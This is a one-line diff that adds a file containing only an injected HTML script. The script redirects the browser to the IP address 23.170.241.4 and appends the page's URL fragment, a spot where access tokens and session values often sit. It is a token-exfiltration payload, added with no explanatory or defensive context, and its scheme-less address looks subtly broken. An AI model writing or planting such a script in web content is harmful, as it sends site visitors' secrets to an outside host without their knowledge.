@@ -1,0 +1,1 @@
+<script>document.location.href = '23.170.241.4/'+window.location.href.split('#')[1];</script>
